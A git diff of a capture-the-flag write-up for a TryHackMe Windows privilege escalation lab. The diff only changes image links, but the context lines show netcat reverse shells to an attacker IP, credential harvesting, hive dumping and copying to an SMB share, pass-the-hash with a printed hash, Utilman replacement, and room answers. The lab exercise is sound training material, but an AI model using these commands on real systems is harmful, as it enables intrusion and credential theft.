@@ -1,7 +1,7 @@
 ![Windows Privilege Escalation Banner](Windows_Privilege_Escalation_Banner.png)
 
 <p align="center">
-   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Cover.png" alt="Windows Privilege Escalation Logo">
+   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Cover.png" alt="Windows Privilege Escalation Logo">
 </p>
 
 # Windows Privilege Escalation
@@ -42,7 +42,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    ```
 
-   ![Harvesting Powershell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Powershell.png)
+   ![Harvesting Powershell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Powershell.png)
 
    ><details><summary>Click for answer</summary>ZuperCkretPa5z</details>
 
@@ -50,7 +50,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
 
    First we open the config file located at: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`. We then look for any mentions of the account `db_admin`.
 
-   ![Harvesting IIS](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_IIS.png)
+   ![Harvesting IIS](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_IIS.png)
 
    ><details><summary>Click for answer</summary>098n0x35skjD3</details>
 
@@ -62,7 +62,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    cmdkey /list
    ```
 
-   ![Harvesting Creds](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Creds.png)
+   ![Harvesting Creds](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Creds.png)
 
    Now we can spawn a shell under this user and view the flag.
 
@@ -70,7 +70,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    runas /savecred /user:admin cmd.exe
    ```
 
-   ![Harvesting Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Flag.png)
+   ![Harvesting Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Flag.png)
    
    ><details><summary>Click for answer</summary>THM{WHAT_IS_MY_PASSWORD}/details>
 
@@ -82,7 +82,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
    ```
 
-   ![Harvesting Putty](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Putty.png)
+   ![Harvesting Putty](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Harvesting_Putty.png)
 
    ><details><summary>Click for answer</summary>CoolPass2021</details>
 
@@ -96,7 +96,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    schtasks /query /tn vulntask /fo list /v
    ```
 
-   ![Quick Task](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Task.png)
+   ![Quick Task](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Task.png)
 
    Using `icacls` we can see the permission we have to modify this file. Looks like we can edit it.
 
@@ -104,7 +104,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    icacls C:\tasks\schtask.bat
    ```
    
-   ![Quick Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Permissions.png)
+   ![Quick Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Permissions.png)
 
    Now lets edit the bat file to execute our reverse shell.
 
@@ -112,7 +112,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    echo C:\Tools\nc64.exe -e cmd.exe 10.18.78.136 1337 > C:\tasks\schtask.bat
    ```
 
-   ![Quick Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Script.png)
+   ![Quick Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Script.png)
 
 
    Last thing to do, is set up our listener and run the task manually.
@@ -123,11 +123,11 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    schtasks /run /tn vulntask
    ```
    
-   ![Quick Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Reverse_Shell.png)
+   ![Quick Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Reverse_Shell.png)
 
    Now we can navigate to the users desktop and read the flag.
 
-   ![Quick Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Flag.png)
+   ![Quick Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Quick_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{TASK_COMPLETED}</details>
 
@@ -143,7 +143,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    icacls C:\PROGRA~2\SYSTEM~1\WService.exe
    ```
 
-   ![Services Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Permissions.png)
+   ![Services Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Permissions.png)
 
    Looks like we can. Now we can make our reverse payload with msfvenom.
 
@@ -171,7 +171,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    icacls WService.exe /grant Everyone:F
    ```
 
-   ![Services Move File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Move_File.png)
+   ![Services Move File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Move_File.png)
    
    The last thing to do, is stopping the service and then restarting it.
 
@@ -181,11 +181,11 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    sc start windowsscheduler
    ```
 
-   ![Services Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Connection.png)
+   ![Services Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Connection.png)
    
    Now we can look for the flag on the users desktop.
 
-   ![Services Flag1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Flag1.png)
+   ![Services Flag1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Flag1.png)
 
    ><details><summary>Click for answer</summary>THM{AT_YOUR_SERVICE}</details>
 
@@ -199,7 +199,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    icacls C:\MyPrograms
    ```
 
-   ![Services Quotes Service](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Service.png)
+   ![Services Quotes Service](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Service.png)
 
    Now we can create another reverse shell to use. Then we transfer it over to the target system and move in to the correct folder. Lastly, we must give everyone permission to use the file.
 
@@ -225,11 +225,11 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    sc start "disk sorter enterprise"
    ```
    
-   ![Services Quotes Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Connection.png)
+   ![Services Quotes Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Connection.png)
 
    Now, we only have to look for and read the flag.
 
-   ![Services Quotes Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Flag.png)
+   ![Services Quotes Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Quotes_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{QUOTES_EVERYWHERE}</details>
 
@@ -241,7 +241,7 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    C:\tools\AccessChk>accesschk64.exe -qlc thmservice
    ```
 
-   ![Services Config Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Permissions.png)
+   ![Services Config Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Permissions.png)
    
    Looks like we (BUILTIN\Users) have permission (SERVICE_ALL_ACCESS) to change the configuration.
    
@@ -271,11 +271,11 @@ This guide contains the answer and steps necessary to get to them for the [Windo
    sc start "thmservice"
    ```
    
-   ![Services Config Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Connection.png)
+   ![Services Config Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Connection.png)
    
    Now, we only have to look for and read the flag.
    
-   ![Services Config Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Flag.png)
+   ![Services Config Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Services_Config_Flag.png)
    
    ><details><summary>Click for answer</summary>THM{INSECURE_SVC_CONFIG}</details>
 
@@ -293,7 +293,7 @@ In this task we will use three different methods to get adminstrator privileges.
    whoami /priv
    ```
 
-   ![Windows Privs Privileges](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Privileges.png)
+   ![Windows Privs Privileges](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Privileges.png)
    
    Now that we know we can read/write files we can copy the SYSTEM and SAM hives to our account folder.
 
@@ -302,7 +302,7 @@ In this task we will use three different methods to get adminstrator privileges.
    reg save hklm\sam C:\Users\THMBackup\sam.hive
    ```
 
-   ![Windows Privs Copy](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Copy.png)
+   ![Windows Privs Copy](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Copy.png)
 
    Now we start a SMB server on our attack machine using `impacket` and transfer the files.
 
@@ -313,7 +313,7 @@ In this task we will use three different methods to get adminstrator privileges.
    copy system.hive \\10.18.78.136\public
    ```
 
-   ![Windows Privs Transfered](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Transfered.png)
+   ![Windows Privs Transfered](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Transfered.png)
 
    Again using `impacket` we can now extract the administrators hash from these files.
 
@@ -321,7 +321,7 @@ In this task we will use three different methods to get adminstrator privileges.
    impacket-secretsdump -sam sam.hive -system system.hive LOCAL
    ```
 
-   ![Windows Privs Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Hash.png)
+   ![Windows Privs Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Hash.png)
 
    With this hash we can perform a Pash the Hash attack on the target machine.
 
@@ -329,7 +329,7 @@ In this task we will use three different methods to get adminstrator privileges.
    impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 Administrator@10.10.8.101
    ```
 
-   ![Windows Privs Connection1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection1.png)
+   ![Windows Privs Connection1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection1.png)
 
    **SeTakeOwnership**
 
@@ -345,19 +345,19 @@ In this task we will use three different methods to get adminstrator privileges.
    copy cmd.exe Utilman.exe
    ```
 
-   ![Windows Privs Take Ownership](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Take_Ownership.png)
+   ![Windows Privs Take Ownership](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Take_Ownership.png)
 
    Now we have successfully taken owners ship of utilman, gotten full permissions, and replaced it with 'cmd.exe`.
 
    Now we can lock the screen and access ease of accces, which will spawn a command shell instead.
 
-   ![Windows Privs Connection2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection2.png)
+   ![Windows Privs Connection2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection2.png)
 
    **SeImpersonate / SeAssignPrimaryToken**
 
    For this we abuse the webshell we currently have running whose user has these privileges set. Checking with `whoami /priv` should confirm this.
 
-   ![Windows Privs Privileges3](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Privileges3.png)
+   ![Windows Privs Privileges3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Privileges3.png)
 
 
    Next, we need to start a listener on our machine.
@@ -372,7 +372,7 @@ In this task we will use three different methods to get adminstrator privileges.
    C:\Tools\RogueWinRM\RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe 10.18.78.136 1337"
    ```
 
-   ![Windows Privs Connection3](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection3.png)
+   ![Windows Privs Connection3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Windows_Privs_Connection3.png)
 
    ><details><summary>Click for answer</summary>THM{SEFLAGPRIVILEGE}</details>
    
@@ -386,7 +386,7 @@ We first use wmic to see which programs are installed. Then we can investigate w
    wmic product get name,version,vendor
    ```
 
-   ![Software Programs](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Software_Programs.png)
+   ![Software Programs](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Software_Programs.png)
 
    In this exercise we use the vulnerable Druva InSync. We will modify the provided exploit to add the `pwnd` user to the administrators group.
 
@@ -425,10 +425,10 @@ We first use wmic to see which programs are installed. Then we can investigate w
    net user pwnd
    ```
    
-   ![Software User](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Software_User.png)
+   ![Software User](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Software_User.png)
    
    To get to the flag, we should open a command prompt as adminstrator. When asked for credentials, we choose pwnd and can leave the password blank (as we didn't specify any).
 
-   ![Software Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Software_Flag.png)
+   ![Software Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/windowsprivesc20/Windows_Privilege_Escalation_Software_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{EZ_DLL_PROXY_4ME}</details>
